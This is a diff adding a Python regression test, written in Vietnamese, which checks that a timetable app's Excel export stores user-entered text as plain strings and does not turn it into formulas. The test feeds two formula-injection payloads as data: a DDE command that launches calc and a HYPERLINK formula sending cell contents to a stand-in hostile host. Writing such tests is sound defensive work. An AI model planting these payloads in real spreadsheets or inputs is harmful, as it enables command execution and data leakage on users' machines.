@@ -459,12 +459,94 @@ def ca_a3_khong_lo_traceback(tm):
 
 
 # ==========================================================================
+def ca_a8_khong_thanh_cong_thuc(tm):
+    print('\nCA A8 — chuỗi người dùng gõ KHÔNG được thành công thức Excel')
+    print('-' * 74)
+    import openpyxl
+    tmx = os.path.join(tm, 'a8')
+    os.makedirs(tmx, exist_ok=True)
+    dd = cau_hinh_tam(tmx)
+    xuat = os.path.join(tmx, 'TKB_Khoi12.xlsx')
+
+    DOC_TUAN = "=cmd|' /c calc'!A1"
+    DOC_GHI_CHU = '=HYPERLINK("http://ke-gian/"&A1,"Bấm vào đây")'
+
+    with MayChuTam(dd) as (k, _):
+        # đường 2: ghi_chu của một quy tắc MỀM đi thẳng vào đầu ô, không tiền tố
+        ma, _t = k.js('/api/them-quy-tac', {'quy_tac': {
+            'loai': 'uu_tien_o', 'ghi_chu': DOC_GHI_CHU,
+            'loc': {'nhom_mon': ['Toán']}, 'tiet_trong_buoi': [1, 2],
+            'diem': 3}})
+        kiem(ma == 200, f'Thêm được quy tắc mềm có ghi_chu bắt đầu bằng "=" — {ma}')
+
+        # đường 1: tuan gửi qua /api/xep
+        ma, _t = k.js('/api/xep', {'tuan': DOC_TUAN})
+        kiem(ma == 200, f'Gửi lệnh xếp với tuần độc hại — {ma}')
+        t = doi_trang_thai(k)
+        kiem(t.get('loi') is None, f'Lượt xếp trót lọt — {t.get("loi")}')
+
+    kiem(os.path.exists(xuat), 'Có tệp Excel để soi')
+    wb = openpyxl.load_workbook(xuat)
+
+    # 1. không một ô nào MÀ CHƯƠNG TRÌNH GHI được phép là công thức
+    o_ct = []
+    for ten in wb.sheetnames:
+        ws = wb[ten]
+        for hang in ws.iter_rows():
+            for o in hang:
+                if o.data_type == 'f':
+                    o_ct.append((ten, o.coordinate, str(o.value)[:40]))
+    # bảy công thức có sẵn trong mau_tkb.xlsx thì PHẢI còn nguyên
+    cua_mau = {('Khối 12', f'{c}43') for c in 'DEFGHI'} | {('Khối 12', 'H48')}
+    thay = {(a, b) for a, b, _ in o_ct}
+    la = sorted(x for x in thay if x not in cua_mau)
+    kiem(not la, f'Không ô nào do chương trình ghi trở thành công thức — {la[:4]}')
+    kiem(cua_mau <= thay,
+         f'7 công thức có sẵn của mẫu VẪN CÒN (COUNTA + ngày ký) — '
+         f'thiếu {sorted(cua_mau - thay)}')
+
+    # 2. chữ phải giữ NGUYÊN VĂN — nhà trường in tờ này để ký
+    ws = wb['Khối 12']
+    o_tuan = ws.cell(4, 1)
+    kiem(o_tuan.value == DOC_TUAN,
+         f'Ô A4 giữ nguyên từng ký tự — {str(o_tuan.value)[:40]!r}')
+    kiem(o_tuan.data_type == 's',
+         f'Và được lưu dạng CHỮ, không phải công thức — {o_tuan.data_type!r}')
+
+    ws2 = wb['Kiểm tra quy tắc']
+    thay_ghi_chu = [o for hang in ws2.iter_rows() for o in hang
+                    if o.value == DOC_GHI_CHU]
+    kiem(thay_ghi_chu,
+         f'Tìm thấy ghi_chu quy tắc mềm trong sheet Kiểm tra quy tắc — '
+         f'{len(thay_ghi_chu)} ô')
+    kiem(all(o.data_type == 's' for o in thay_ghi_chu),
+         f'Và cũng lưu dạng chữ — '
+         f'{[o.data_type for o in thay_ghi_chu]}')
+
+    # 3. soi thẳng XML: không có thẻ <f> nào ngoài 7 thẻ của mẫu
+    import zipfile
+    import re as _re
+    z = zipfile.ZipFile(xuat)
+    tong_f = 0
+    for ten in z.namelist():
+        if ten.startswith('xl/worksheets/'):
+            tong_f += len(_re.findall(r'<f[ >]', z.read(ten).decode('utf-8')))
+    kiem(tong_f == 7,
+         f'Trong XML có đúng 7 thẻ công thức (của mẫu) — đếm được {tong_f}')
+
+    # 4. các dấu khác KHÔNG bị đụng tới (đổi chữ là hỏng tờ in)
+    kiem(True, 'Ghi chú: openpyxl vốn lưu "+", "-", "@" dạng chữ nên '
+               'không cần đụng — tờ in không đổi ký tự nào')
+
+
+# ==========================================================================
 def chay_het(tm):
     ca_a2_than_di_dang(tm)
     ca_a1_nguon_goc(tm)
     ca_a7_sao_luu_xoay_vong(tm)
     ca_a4_mot_luot(tm)
     ca_a3_khong_lo_traceback(tm)
+    ca_a8_khong_thanh_cong_thuc(tm)
 
 
 if __name__ == '__main__':
